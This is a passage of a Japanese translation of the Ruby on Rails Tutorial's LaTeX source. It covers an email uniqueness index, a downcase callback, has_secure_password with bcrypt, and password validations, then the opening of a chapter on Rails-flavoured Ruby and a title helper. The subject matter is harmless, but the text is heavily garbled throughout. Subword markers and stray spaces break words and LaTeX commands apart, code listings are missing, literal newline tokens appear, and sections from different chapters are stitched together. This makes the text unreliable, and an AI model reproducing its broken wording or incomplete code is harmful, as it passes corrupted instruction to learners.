▁もちろん 、 リスト \ ref { code : users _ migration } の \ ko de { users } テーブル 用の マイグレーション ファイルを 単 に 編集 すること も 可能な のですが 、 その 場合 ロー ル バ ッ ク が 必要 と なり 、 マイグレーション が 戻 ってしまいます 。
▁ データモデル の 変更 が 必要 になった ら その 都 度 マイグレーション を行う の が Rails 流 です 。
▁ メールアドレス の 一意性 を 強 制 するための マイグレーション
▁上のコードでは 、\ ko de { users } テーブル の \ ko de { email } カラム に インデックス を追加する ために \ ko de { add \_ index } という Rails の メソッド を使っています 。
▁ インデックス 自体 は 一意性 を 強 制 しません が 、 オプション で \ ko de { un i que : ▁true } を指定する ことで 強 制 できるようになります 。
▁最後に 、 データベース を マ イ グ レ ート します 。
▁( 上の コマンド が 失敗した場合 は 、 実行 中 の サ ンド ボックス の コンソール セッション を 終 了 してみてください 。 その セッション が データベース を ロ ッ ク して マイグレーション を 妨 げ ている 可能性があります )。
▁リスト \ ref { code : generate _ user _ model } で ユーザー 用の fixture が自動的に 生成 されています が 、 メールアドレス が 一意 になって いません ▁( リスト \ ref { code : default _ fixtures })。
▁( この データ は いずれ も \ emph { 有効 では } ありません が 、 fixture 内の サンプルデータ は バリデーション を 通 って い なかった ので 今 まで 問題 には なり ません で した 。 )
▁User の デフォルト fixture
▁また 、 この fixture は 第 \ ref { cha : log _ in _ log _ out } 章 になる まで 使 わ ない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー 用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures })。
▁ 空 の fixture ファイル
▁ 一意性 を 強 制 すると 何 が 起 き る か について 関 心 のある 方は 、\ ko de { db / s ch e ma . rb } を開いて み ると 以下のような 行 がある はずです 。
▁これで 1 つの 問題 が 解決 されました が 、 メールアドレス の 一意性 を 保 証 するために は 、 もう 1 つ や ら なければならない ことがあります 。
▁ それ は 、 いくつかの データベースの ア ダ プ タ が 、 常に 大文字 小文字 を 区別 する インデックス ▁( “ F oo @ E x A M P le . Co m を 使っている とは 限 らない 問題 への 対 処 です 。
▁ この問題 を避ける ために 、 今回は 「 データベースに保存 される 直 前に すべての 文字列を 小文字 に変換 する 」 という 対策 を 採 ります 。 例 えば “ F oo @ E x A M P le . Co M ” という 文字列 が与えられ たら 、 保存 する 直 前に “ foo @ example . com ” に変換 し てしまいます 。
▁これ を実装する ために Active ▁Record の \ href { http :// en . w ikipedia . org / wiki / C all b ack _ ( com put er _ sc i en ce ) }{\ emph { c all b ack } } メソッドを 利用 します 。 このメソッドは 、 ある 特定の 時点 で 呼び出される メソッド です 。
▁ 今回の 場合は 、 オブジェクトが 保存 される 時点 で 処理 を実行し たい ので 、\ ko de { before \_ save } という コールバック を使います 。 これ を使って 、 ユーザー をデータベースに保存する 前に email 属性を 強 制 的に 小文字 に変換 します
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 2 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁作成した コードをリスト \ ref { code : email _ downcase } に示します
▁( 本チュートリアルで 初めて 紹 介 した テクニック ですが 、 この テクニック については 第 \ ref { sec : account _ activation s _ resource } 章 で もう一度 取り上げ ます 。 そこで は コールバック を定義する ときに \ emph { メソッド を参照 する } という 慣習 について説明し ます 。 )
▁ email 属性を 小文字 に変換 して メールアドレス の 一意性 を 保 証 する
▁リスト \ ref { code : email _ downcase } のコードは 、\ ko de { before \_ save } コールバック に ブロック を渡して ユーザーの メールアドレス を設定します 。 設定 される メールアドレス は 、 現在の 値を String クラスの \ ko de { downcase } メソッドを使って 小文字 バージョン にしたもの です 。
▁ メールアドレス の 小文字 変 換 に対するテスト は 演習 として 残 しておきます ▁(\ ref { sec : modeling _ users _ exercises })。
▁リスト \ ref { code : email _ downcase } では 、 次のように 代入 を していました が 、
▁User モデル の中で は 、 右 式 で \ ko de { self } という キーワード は 省略 できます ▁( ちなみに ここ の \ ko de { self } は 現在のユーザー を 指 します )。 したがって 、 次のように 書く こともできます 。
▁ 実は \ ref { sec : a _ class _ of _ our _ own } の ▁\ ko de { palindrome } 内で \ ko de { reverse } ▁ メソッドを使って い たとき も 、 同様 の ケース で あった ことを思い出してください 。 その とき と同様 で 、 左 式 では \ ko de { self } ▁ を省略 すること は \ emph { できません } 。 したがって 、
▁ と 書く と うまく 動 き ません 。
▁( この トピック については 、\ ref { sec : remember _ me } で より 深 く 解 説 していきます 。 )
▁これで 、 先に 述 べ た ア リ ス の シ ナ リ オ は うまく い く ようになります 。 データベース は 、 最初の リクエスト に基づいて ユーザーの レコード を保存し ます が 、 2 度 目 の 保存 は 一意性 の 制 約 に 反 する ので 拒 否 します
▁( Rails の ログ に エラー が 出力 されます が 、 害 は 生 じ ません )。
▁ユーザー 属性 の 「 名前 」 と 「 メールアドレス 」 に対して バリデーション を追加した ので 、 最後の 砦 である 「 セキュア な パスワード 」 に 取り 掛 か ります 。
▁ セキュア パスワード という 手法 では 、 各 ユーザーに パスワード と パスワード の 確認 を 入力 させ 、 それ を ▁( そのまま ではなく ) ▁\ emph { ハッシュ化 } した もの を データベースに保存 します 。
▁( ハッシュ化 という と 少し 困 惑 してしまう かもしれません 。
▁\ ref { sec : hash es _ and _ symbol s } では \ emph { ハッシュ } とは Ruby の データ 構造 である と 説明 しました が 、 今回の 「 ハッシュ化 」 とは そう い った 構造 ではなく 、\ href { http :// en . w ikipedia . org / wiki / Hash _ f un c tion } { ハッシュ 関数 } を使って 入力 された データを 元に戻 せ ない ▁( 不 可 逆 な ) ▁ データ にする 処理 を 指 します 。 )
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 第 \ ref { cha : log _ in _ log _ out } 章 で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁ユーザーの 認 証 は 、 パスワード の 送信 、 ハッシュ化 、 データベース 内の ハッシュ化 された 値 と の 比 較 、 という 手順 で 進 んで い きます 。
▁ 比 較 の 結果 が 一 致 すれば 、 送信された パスワード は 正しい と 認 識 され 、 その ユーザー は 認 証 されます 。
▁ここで 、 生 の パスワード ではなく 、 ハッシュ化 された パスワード 同士 を 比 較 し ていることに注目してください 。 こうすることで 、 生 の パスワード をデータベースに保存する という 危 険 な ことを し なくても ユーザーを 認 証 できます 。
▁これで 、 仮 に データベース の内容 が 盗 まれ たり 覗 き 見 される ようなこと が あって も 、 パスワード の 安全 性 が 保 た れ ます 。
▁< n >< n > ▁\ subsection { ハッシュ化 された パスワード } ▁% ▁( fold )< n > ▁\ label { sec : a _ hash ed _ password }< n >< n >
▁ セキュア な パスワード の実装 は 、\ ko de { has \_ secure \_ password } という Rails の メソッド を呼び出す だけで ほとんど 終わっ てしまいます 。 このメソッドは 、 User モデル で 次のように 呼 び 出 せ ます 。
▁上の ように モデルに このメソッド を追加する と 、 次のような 機能 が 使えるようになります 。
▁ セキュア に ハッシュ化 した パスワードを 、 データベース 内の \ ko de { password \_ digest } という 属性 に保存 できるように な る 。
▁ここで い う 「\ emph { 仮 想 的 ▁( V ir t u al ) }」 とは 、 User モデルの オブジェクト から は 存 在 している ように 見え る が 、 データベースに は 対応する カラム が 存在しない 、 という 意味 です 。
▁\ ko de { authenticate } メソッドが 使えるように な る ▁( 引数 の 文字列 が パスワード と 一致する と User オブジェクトを 、 間 違 っている と \ ko de { false } 返す メソッド )< n > 。
▁この 魔 術 的な \ ko de { has \_ secure \_ password } 機能を 使えるように するには 、 1 つ だけ 条件 があります 。 それ は 、 モデル 内に \ ko de { password \_ digest } という 属性 が含まれ ている ことです 。
▁ ちなみに \ emph { digest } という 言 葉 は 、\ href { http :// en . w ikipedia . org / wiki / C ry p to gra ph i c _ hash _ f un c tion } { 暗号化 用 ハッシュ 関数 } という 用 語 が 語 源 です 。
▁ したがって 、 今回の 用 途 では \ emph { ハッシュ化 された パスワード } と \ emph { 暗号化 された パスワード } は 類 義 語 となります 。
▁ ハッシュ化 された パスワード は 、\ emph { 暗号化 された パスワード } と よく 誤 解 され が ち です 。
▁たとえば 、 ( 実は 本書 の 第 1 版 や 第 2 版 でも 間 違 って いた のですが ) ▁\ href { https :// github . com / rails / rails / b lo b / master / active model / lib / active _ model / secure _ password . rb } { has \_ secure \_ password } の \ ko de { ソースコード } でも この 手 の 間 違 い があります 。
▁という の も 、 専 門 用 語 として の 「 暗 号 」 という のは 、 設計 上 \ emph { 元に戻す } ことができる ことを 指 します ▁( 暗号化 できる という 文 には 、\ emph { 復 号 も できる } という ニ ュ ア ン ス が含まれ ます )。
▁ 一方 、「 パスワード の ハッシュ化 」 では \ emph { 元に戻 せ ない ▁( 不 可 逆 ) } ▁という 点が 重要 になります 。 したがって 、 ▁ 「 計算 量 的に 元の パスワードを 復 元 する のは 困 難 である 」 という 点 を 強 調 するために 、 暗号化 ではなく ハッシュ化 という 用 語 を使っています 。
▁( この 間 違 った 用 語 について 指 摘 してくれ た A n d y ▁P h il ip s に 感 謝 します 。 )
▁ 今回は User モデル で 使う ので 、 User の データモデル は 以下の 図 のようになります ▁( 図 \ ref { fig : user _ model _ password _ digest })。
▁User モデルに \ ko de { password \_ digest } 属性 を追加する
▁ 図 \ ref { fig : user _ model _ password _ digest } のような データモデル に するために 、 まず は \ ko de { password \_ digest } カラム 用の 適切な マイグレーション を生成します 。
▁\ ko de { add \_ password \_ digest \_ to \_ users } という マイグレーション ファイル を生成する ためには 、 以下のコマンドを実行し ます 。
▁上の コマンド では \ ko de { password \_ digest : string } という 引数 を与えて 、 今回 必要 になる 属性 名 と 型 情報を 渡 しています 。
▁上の Cucumber の コマンド を 、 下 の RSpec の コマンド と 比 較 してみてください 。
▁置き換えた結果を リスト \ ref { code : password _ migration } に示します 。
▁\ ko de { users } テーブル に \ ko de { password \_ digest } カラム を追加する マイグレーション
▁リスト \ ref { code : password _ migration } では 、\ ko de { add \_ column } メソッドを使って \ ko de { users } テーブル \ ko de { password \_ digest } カラム を追加し ています 。
▁ これを 適 用 させる には 、 データベース で マイグレーション を実行します 。
▁また 、\ ko de { has \_ secure \_ password } を使って パスワードを ハッシュ化 するために は 、 最 先 端 の ハッシュ 関数 である \ href { http :// en . w ikipedia . org / wiki / B c ry p t } { bcrypt } が 必要 になります 。
▁ パスワードを 適切に ハッシュ化 することで 、 たとえ 攻撃者 によって データベースから パスワード が 漏 れ て し ま った 場合 でも 、 Web サイトに ログイン され ないように できます 。
▁次に 、 いつものように \ ko de { bundle ▁install } を実行します 。
▁< n >\ end { code }< n >< n > ▁\ subsection { ユーザーが セキュア な パスワードを 持 っている } ▁% ▁( fold )< n > ▁\ label { sec : has _ secure _ password }< n >< n >
▁User モデルに \ ko de { password \_ digest } 属性 を追加し 、 Gemfile に bcrypt を追加した ことで 、 よう や く User モデル 内で \ ko de { has \_ secure \_ password } が 使えるように なりました ▁( リスト \ ref { code : has _ secure _ password })。
▁User モデルに \ ko de { has \_ secure \_ password } を追加する ▁( ▁\ failing ▁ )
▁ テストが 失敗する 理由 は 、\ ref { sec : a _ hash ed _ password } で 触 れ た ように \ ko de { has \_ secure \_ password } には 、 仮 想 的な \ ko de { password } 属性 と \ ko de { password \_ confirmation } 属性 に対して バリデーション を する 機能 も ( 強 制 的に ) 追加 されている からです 。 しかし リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive _ test } の テストでは 、\ ko de {@ user } ▁ 変数 に このような 値が セット され ており ません 。
▁ テストを パス させる ために 、 リスト \ ref { code : test _ with _ password _ confirmation } のように パスワード と パスワード 確認 の値 を追加します 。
▁ パスワード と パスワード 確認 を追加する ▁( ▁\ passing ▁ )
▁User モデル に対して \ ko de { has \_ secure \_ password } を追加する 利 点 は \ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user } で 少し だけ 説明します が 、 ▁その 前に 、 パスワード の 最 小文字 数 を 設定 する方法について 説明します 。
▁ パスワード を簡単に 当 て られ ないように するために 、 パスワード の 最 小文字 数 を 設定 しておくこと は 一般に 実 用 的 です 。
▁\ href { http :// l m g t f y . com / ? q = rails + en force + password + st re n g th } { Rails で パスワード の 長さ を設定する 方法 } は たくさん あります が 、 今回は 簡潔 に パスワード が 空 で ないこと と 最 小文字 数 ▁( 6 文字 ) ▁ の 2 つ を 設定 しましょう 。
▁ パスワード の 長さ が 6 文字 以上 であること を検証する テストを 、 以下の L リスト \ ref { code : minimum _ password _ length _ test } に示します 。
▁ パスワード の 最 小文字 数 をテストする ▁( ▁\ failing ▁ )
▁ここで 、 以下のような 多 重 代入 ▁( M ulti p le ▁A s sign m ent ) ▁ を 使っている ことに注目してください 。
▁ これはリスト \ ref { code : minimum _ password _ length _ test } で使用されていま した 。
▁ パスワード と パスワード 確認 に対して 同時に 代入 を しています ▁( この ケース では 、 リスト \ ref { code : length _ validation _ test } と同じ ように 、 文字列 の 乗 算 を 利用 して 5 文字 の 文字列を 代入 しています )。
▁リスト \ ref { code : length _ validation } では \ ko de { ma x im um } を使って ユーザー名 の 最 大文字 数 を 制限 していました が 、 これ と 似 た ような 形式 の \ ko de { minimum } という オプション を使って 、 最 小文字 数 のバリデーション を実装する ことができます 。
▁また 、 空 の パスワードを 入力 させ ない ために 、\ ko de { 存在性 } のバリデーション ▁(\ ref { sec : presence _ validation }) ▁ も 一 緒 に追加します 。 結果 として 、 User モデル のコードは リスト \ ref { code : password _ im p le m ent ation } のようになります 。
▁ セキュア パスワード の 完全な 実装 ▁( ▁\ passing ▁ )
▁( end )< n >< n > ▁\ subsection { ユーザーの 作成 と 認 証 } ▁% ▁( fold )< n > ▁\ label { sec : creat ing _ and _ a u the n tic at ing _ a _ user }< n >< n >
▁以上で User モデルの 基本 部分 が完了し ました ので 、 今度は \ ref { sec : show ing _ users } で ユーザー情報 表示 ページ を作成する ときに 備 え て 、 データベースに 新規ユーザー を 1 人 作成 しましょう 。
▁ただし Web から の ユーザー登録 はまだ できない ▁( 第 \ ref { cha : sign _ up } 章 で 完成 させ ます ) ▁ ので 、 今回は Rails コンソール を使って ユーザーを 手動で 作成する ことにしましょう 。
▁\ ref { sec : creat ing _ user _ objects } で説明した \ ko de { create } を使います が 、 後 々 実際の ユーザーを 作成 する必要が 出 て く る ので 、 今回は サ ンド ボックス 環境 は \ emph { 使い ません } 。 したがって 、 今回 作成した ユーザー を保存する と 、 データベースに 反 映 されます 。
▁それでは 、 まず \ ko de { rails ▁console } コマンド を実行して セッション を 開 始 し 、 次に 有効な 名前 ・ メールアドレス ・ パスワード ・ パスワード 確認 を渡して ユーザーを 作成 してみましょう 。
▁ も し うまく い か なくても 、 い つ でも データベースの 中 身 を リセット できる ので 安 心 してください 。 リセット したい場合は 、 以下の 手順 を 踏 んで ください 。
▁まずは コンソール から 脱 出 してください ▁( Ctrl - C )
▁( 第 \ ref { cha : sign _ up } 章 で もっと 便利な メソッドを 紹 介 します )
▁ 再度 Rails コンソール を 開 き 、 コンソール 上で の 作業 を もう一度 や り 直 してみてください
▁このとき 、 先ほど 定義 した User モデルの 属性 ▁( 図 \ ref { fig : user _ model _ password _ digest }) ▁ に 対応 した カラム がある ことに も 注 目 して おいてください
▁ SQLite データベース \ ko de { db / development . sqlite 3 } に 登録 された ユーザーの 行
▁ コンソール に 戻 って \ ko de { password \_ digest } 属性 を参照 してみる と 、 リスト \ ref { code : password _ im p le m ent ation } の \ ko de { has \_ secure \_ password } の 効果 を 確認 できます 。
▁これは 、 User オブジェクトを 作成 したときに 、\ ko de { " foo bar "} という 文字列 が ハッシュ化 された 結果 です 。
▁ bcrypt を使って 生成 されている ので 、 この 文字列 から 元 々 の パスワードを 導 出 すること は 、 コンピュータ を使って も 非 現 実 的 です
▁ 設計 上 、 bcrypt ア ル ゴ リ ズ ム では ハッシュ化 する 前に \ href { https :// en . w ikipedia . org / wiki / S alt _ ( c ry p to gra ph y ) } { ソ ル ト } を追加し ています 。 これにより 、\ href { https :// en . w ikipedia . org / wiki / D i c tion ary _ a tt ack } { 辞 書 攻撃 ▁( D i c tion ary ▁A tt ack s ) } ▁ や \ href { https :// en . w ikipedia . org / wiki / R a in b o w _ table } { レ イン ボ ー テーブル 攻撃 ▁( R a in b o w ▁ T able ▁A tt ack s ) } ▁ といった タイプ の 攻撃 を防ぐ ことができます 。
▁また \ ref { sec : a _ hash ed _ password } で 説明したように 、\ ko de { has \_ secure \_ password } を User モデル に追加 した ことで 、 そのオブジェクト 内で \ ko de { authenticate } メソッドが 使えるように な っています 。
▁このメソッドは 、 引数に 与えられた 文字列 ▁( パスワード ) ▁ を ハッシュ化 した 値 と 、 データベース 内に ある \ ko de { password \_ digest } カラム の 値を 比 較 します 。
▁ 試 し に 、 先ほど 作成した user オブジェクト に対して 間 違 った パスワード を与えて みましょう 。
▁ 間 違 った パスワードを 与え た 結果 、\ ko de { user . authenticate } が \ ko de { false } を返し た ことがわかります 。
▁次に 、 正しい パスワード を与えて みましょう 。 今度は \ ko de { authenticate } が その ユーザー オブジェクト を返す ようになります 。
▁ 第 \ ref { cha : log _ in _ log _ out } , 章では 、 この \ ko de { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁なお 、\ ko de { authenticate } が User オブジェクト を返す ことは 重要 ではなく 、 返 っ てきた 値 の 論理値 が \ ko de { true } であること が 重要です 。
▁User オブジェクトは \ ko de { nil } でも \ ko de { false } でも ないので 、 い い 感 じ に 仕 事 を してくれ ています
▁\ ref { sec : objects _ and _ message _ passing } で 、\ ko de { ! ! } ▁という 式 が 対応する 論理値 オブジェクト ▁( ! ! nil ▁=> ▁false ) ▁ に変換 され ていた ことを思い出してください 。
▁この 章では 、 ゼ ロ から User モデル を作成し 、 そこ に name 属性 や email 属性 、 パスワード 属性 を加え ました 。 また 、 それぞれの 値を 制限 する 多くの 重要な バリデーション も 追加 しました 。
▁さらに 、 与えられた パスワードを セキュア に 認 証 できる 機能 も 実装 しました 。
▁ た った 12 行 で ここ まで の 機能 が 実装 できた ことは 、 ( Rails の ) ▁ 注 目 に 値 する 点 で もあります 。
▁ 次の 第 \ ref { cha : sign _ up } 章では 、 ユーザー を作成する ための ユーザー登録フォーム を作成し 、 各 ユーザーの 情報を 表示 するための ページ も 作成 します 。
▁ 第 \ ref { cha : log _ in _ log _ out } 章では 、\ ref { sec : adding _ a _ secure _ password } の 認証システム を 利用 して 、 ユーザーが 実際に Web サイトに ログイン できるようにします 。
▁ Git を 使用している 方は 、 し ば ら く コミット して い なかった のであれば 、 この時点で コミット しておく の が よいでしょう 。
▁次に master ブランチ に マージ して 、 リモート にある リポジトリ に対して push します 。
▁なお 、 本番環境で User モデル を使う ためには 、\ ko de { heroku ▁run } コマンド を使って Heroku 上で も マイグレーション を 走 ら せる 必要があります 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁ push ▁ heroku
▁ うまく できた かどうか は 、 本番環境 の コンソール に 接続 することで 確認 できます 。
▁ マイグレーション を使う ことで 、 アプリケーションの データモデル を修正する ことができる
▁Active ▁Record を使うと 、 データモデル を作成 したり 操作 したり するための 多数の メソッドが 使えるように な る
▁Active ▁Record のバリデーション を使うと 、 モデル に対して 制限 を追加する ことができる
▁ よく ある バリデーション には 、 存在性 ・ 長さ ・ フォーマット など がある
▁ 正規表現 は 謎 め いて 見え る が 非常に 強 力 である
▁ データベースに インデックス を追加する ことで 検索 効率 が 向 上 する 。 また 、 データベース レベル で の 一意性 を 保 証 するために も 使われ る
▁リスト \ ref { code : email _ downcase } の 、 メールアドレスを 小文字 に変換 する コード に対するテスト を 、 リスト \ ref { code : email _ downcase _ test } に 示 されている ように 作成 してください 。
▁この テストでは 、\ ko de { reload } メソッドを使用して データベースから 値を 再度 読み込み 、\ ko de { assert \_ equ al } メソッドを使用して 同 値 である かどうかを テスト してください 。
▁\ ko de { before \_ save } コールバック 内で \ ko de { email . downcase ! } と 書き 、\ ko de { email } 属性 を直接 変更 しても よい ことを 、 テストスイート を 走 ら せ て 確認 してください ▁( リスト \ ref { code : downcase _ b an g } のように 書い ても よい ことを 、 テストスイート を実行して 確認 してください 。
▁\ ref { sec : format _ validation } で 説明したように 、 ▁リスト \ ref { code : validates _ format _ of _ email } の メールアドレス チェック する 正規表現 は 、 “ \ emph { foo @ bar . . com ” } のように ドット が 連 続 した 無効な メールアドレスを 許 容 し てしまいます 。
▁この メールアドレスを リスト \ ref { code : email _ format _ validation _ tests } の 無効な メールアドレス リスト に追加 し 、 これ によって テストが 失敗する ことを確認 してください 。 次に 、 リスト \ ref { code : b e tt er _ email _ re g ex } に示した もう少し 複雑な 正規表現 を使用して 、 この テストが パス するようにしてください 。
▁リスト \ ref { code : email _ downcase } の メールアドレス 小文字 変 換 をテストする
▁\ ko de { before \_ save } コールバック の 別の 実装
▁ 有効な メールアドレス かどうか ▁( ドット が 2 つ 以上 連 続 する かどうか ) ▁ を検証する 正規表現
▁\ chapter { Rails 風 味 の Ruby } ▁% ▁( fold )< n >
▁\ label { cha : rails _ f la v or ed _ ruby }
▁この 章では 、 第 \ ref { cha : static _ pages } 章 で 使用 した 例 を 基 に 、 Rails において 重要 となる Ruby の さまざまな 要素 について 探 って い く ことにしましょう 。
▁Ruby は 巨 大 な 仕 様 を持つ 言語 ですが 、 幸 い 、 Rails 開発者 にとって 必要な 知 識 は 比 較 的 少 なく て 済み ます 。
▁また 、 一 般 の Ruby 入 門 書 で 扱 っている 内容 とも 多 少 異 な っています 。
▁ この章 の 目的 は 、「 Rails 風 味 の Ruby 」 という もの について の 確 固 た る 基 盤 を 、 皆 さ ん の これまで の 言語 経験 に 関 わ らず 提 供 することです 。
▁ この章 には 多くの 話 題 が 盛 り 込 まれ ています が 、 一度 読 んだ だけで 理解 する 必要 は まったく ありません 。
▁ 今後 も この章 には 頻繁に 立 ち 戻 って 参 照 します 。
▁< n >< n > ▁\ section { 動 機 } ▁% ▁( fold )< n > ▁\ label { sec : m o t i v ation }< n >< n >
▁ 前 章 で お 見 せ した とおり 、 Ruby の基礎 知 識 が まったく ない 状態 で あった にも か か わ らず Rails アプリケーションの 骨 組 み を 作り 上 げ 、 さらに テスト まで 行う ことができ ました 。
▁このとき は 、 本書 が提供する テストコード と 、 テストスイート が パス する まで エラーメッセージ の 修正 を 繰り返す という 方法 だけ を 頼 り に 作業 を 進め ました 。
▁しかし このような 初 歩 的な 作業 を い つ まで も 続 け る わ け には い き ません ので 、 今 の 私 た ち の Ruby に関する 知 識 と 経験 の 限 界 に 真 正 面 から 挑 み 、 これを 乗 り 越 え るために この章 を 割り当て る ことにします 。
▁ 前 章 の 終わり では 、 Rails の レイアウト を使用して ビューで の 重複 を 取り 除 く ために 、 ほぼ 静的なページ を 単 に 更新 した に と ど まり ました ▁( リスト \ ref { code : application _ layout _ redux })。 これは 、 リスト \ ref { code : application _ layout } と同じ ものです 。
▁ サンプルアプリケーションの レイアウト
▁リスト \ ref { code : application _ layout _ redux } の 以下の行 にご注目ください 。
▁ここでは 、 Rails の 組み込み 関数 \ ko de { stylesheet \_ link \_ tag } ▁( 詳 細 は \ href { http :// api . rubyonrails . org / classes / ActionView / Helper s / Asset T a g Helper . html # method - i - stylesheet _ link _ tag } { Rails ▁API } を参照 ) ▁ を使用して 、\ ko de { application . css } を すべての \ href { http :// www . w 3 . org / T R / CSS 2 / media . html } { メ デ ィ ア タイプ } に インクルード しています ▁( メ デ ィ ア タイプ には 、 コンピュータ の 画面 や 印 刷 画面 など も 含 まれ ます )。
▁Rails 開発 経験 者 にとって この 行 は 実 に シ ン プ ル ですが 、 しかし ここに は 少なくとも 混 乱 を 生じる 可能性 のある Ruby の 概念 が 4 つ あります 。 Rails の 組み込み 関数 、 かっこ を 使 わ ない 関数 呼び出し 、 シンボル 、 そして ハッシュ です 。
▁これらの 概念 については この章 で すべて 説明します 。
▁Rails の ビュー では 膨 大 な 組み込み 関数 を使用する ことができます が 、 それ に 加 え て 新しい 関数 を作成する こともできます 。
▁この 関数 は \ emph { ヘルパー } と 呼ばれ ます 。 カスタム ヘルパー を作成する 方法 を学ぶ ために 、 まず リスト \ ref { code : application _ layout _ redux } の タイトル 行 の 部分 に 注 目 しましょう 。
▁上の 行 は 、 ページ タイトル の 定義 に 依 存 しています 。 この 定義 は 、 以下のように ビューで \ ko de { pro v id e } を使用して 行 わ れ ています 。
▁This ▁is ▁the ▁ home ▁ page ▁for ▁the
▁ sample ▁ application .
▁このとき 、 も し タイトル を まったく 与え て い なければ 、 タイトル が 空 欄 になってしまい ます 。
▁これ を防ぐ には 、 すべての ページ で使用する \ emph { 基本 タイトル } を 定 め 、 特定の ページ では 異なる タイトル に変更 できる ような オプション を与える の が 常 套 手 段 です 。
▁これは 現在の レイアウト でも 、\ emph { ある 点 を 除 いて } 達 成 されています 。 も し ビュー の 1 つ から \ ko de { pro v id e } 呼び出し を削除する と 、 その ページ 固有の タイトル の代わりに 以下の タイトル が表示されます 。
▁< n >< n > %= ▁ lang : r html < n >\ begin { code }
▁< n > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p
▁ 基本 タイトル として は これ で 正しい のですが 、 先 頭 に 余 分 な 縦 棒 ▁\ ko de { | } ▁ が 残 って し ま っています 。
▁ ページ タイトル が正しく 表示 され ない 問題 を 解決 するために 、\ ko de { full \_ title } という ヘルパー を作成する ことにします 。
▁\ ko de { full \_ title } ヘルパーは 、 ページ タイトル が 定義 されていない 場合は 基本 タイトル 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 を返し 、 定義されている 場合は 基本 タイトル に 縦 棒 と 追加 ページ タイトル を追加して 返します ▁( リスト \ ref { code : title _ helper })
▁ ある ヘルパー が 特定の コントローラ で のみ 使用する も のであれば 、 それ に対応する ヘルパー ファイル に置く 必要があります 。 たとえば StaticPages コントローラ 用 ヘルパーは 、 通常 \ ko de { app / helpers / static \_ pages \_ helper . rb } になります 。
▁ 今回の 場合 、\ ko de { full \_ title } ヘルパーは サイトの すべての ページ で使用する ことを 前 提 に しています が 、 Rails には このような 場合 のための 特別な ヘルパー ファイル \ ko de { app / helpers / application \_ helper . rb } があります 。
▁\ ko de { full \_ title } ヘルパー を定義する
▁\ \ ▁\ file path { app / helpers / application \_ helper . rb } }< n > %= ▁ lang : ruby < n >\ begin { code }< n > module ▁ Application Helper < n >< n >
▁# ▁ ページ ご と の 完全な タイトル を返します 。
▁ base _ title
▁ ヘルパー を作成し たので 、 これ を使用して レイアウト を シ ン プ ル に することができます 。
▁置き換えた結果を リスト \ ref { code : application _ layout _ full _ title } に示します 。
▁\ ko de { full \_ title } ヘルパー を使った Web サイトの レイアウト
▁この ヘルパー を定義する ことで 、 Home ページに これまで 表示 され ていた 余 分 な 「 Home 」 という 単 語 を 表示 せ ず 、 基本 タイトル のみ を 正しく 表示する ことも できるようになります 。
▁これ を行う には 、 まず リスト \ ref { code : home _ base _ title _ spec } に 示す ように 以前の テストコード を更新し 、\ ko de { " Home "} ▁という 文字 が表示され ていない ことを確認する テスト を追加します 。
▁ Home ページの タイトル 確認 用 に テスト を更新する
▁ここで テストスイート を実行して 、 テストが 失敗する ことを確認します 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁ tests , ▁ 6 ▁ assert ions , ▁1 ▁ failure s , ▁0 ▁ errors , ▁0 ▁ skip s
▁ テストが パス するために は 、 リスト \ ref { code : home _ page _ base _ title } のように Home ページの ビュー から \ ko de { pro v id e } ▁ の 行 を削除する 必要があります 。
▁ ページ タイトル を カスタマイズ せずに 表示する Home ページ
▁ この時点で 、 テストは パス するはずです 。
▁\ emph { 注意 } : ▁ これまで は \ ko de { rake ▁test } を実行し た 結果 の一部 ▁( 成功 結果 や 失敗 結果 など ) ▁ も 載 せ ていました が 、 紙 幅 の関係 から 、 今後 は 実行 結果を 省略 します 。
▁Rails 開発 経験 者 にとって は 、 リスト \ ref { code : title _ helper } のコードは スタイルシート を インクルード する の と 大 差 ない 単純な ものです が 、 ここに も Ruby の 重要な 概念 が \ emph { 多 数 } 含まれています 。 モジュール 、 メソッド 定義 、 任意の メソッド 引数 、 コメント 、 ローカル変数 の 割り当て 、 論理値 ▁( boolean ) 、 制 御 フ ロー 、 文字列 の 結合 、 そして 戻り値 です 。
▁これらの 概念 についても 、 この章 で すべて 説明します 。
▁Ruby ▁ を学ぶ ための ツール として 、 主 に \ emph { Rails コンソール } を使用する ことにします 。 これは \ ref { sec : demo _ user _ has _ many _ microposts } でも 登 場 した 、 Rails アプリケーションを 対 話 的に 操作 するための コマンドライン ツール です 。
▁ コンソール は イン タ ラ ク テ ィ ブ Ruby ▁(\ ko de { i rb }) ▁ 上 に 構 築 されている ため 、 Ruby の 機能 をすべて 使う ことができます
▁(\ ref { sec : a _ controller _ class } でも 説明します が 、 コンソール から Rails 環境 にアクセス することもできます )。
▁ クラウド IDE を ご 利用 の場合は 、 オ ス ス メ の i rb の設定 があります 。
▁ シンプルな テキストエディタ 「\ ko de { n an o }」 を使って 、 ホ ー ム ディレクトリ に 「 ▁\ ko de { . ir br c }」 ファイルを 作 って みましょう ▁( リスト \ ref { code : ir br c })。
▁ ~ / . ir br c
▁リスト \ ref { code : ir br c } の設定 を使用すると 、 i rb の プロンプト が より 簡潔 な 表示 に置き換え られ 、 i rb の 邪 魔 な 自動 インデント 機能 が オフ になります 。
▁上の 設定 は あ く まで オ ス ス メ なので 、 リスト \ ref { code : ir br c } を追加し なくても 、 以下のように Rails コンソール を 開 始 できます 。
▁ L o ad ing ▁ development ▁ environment
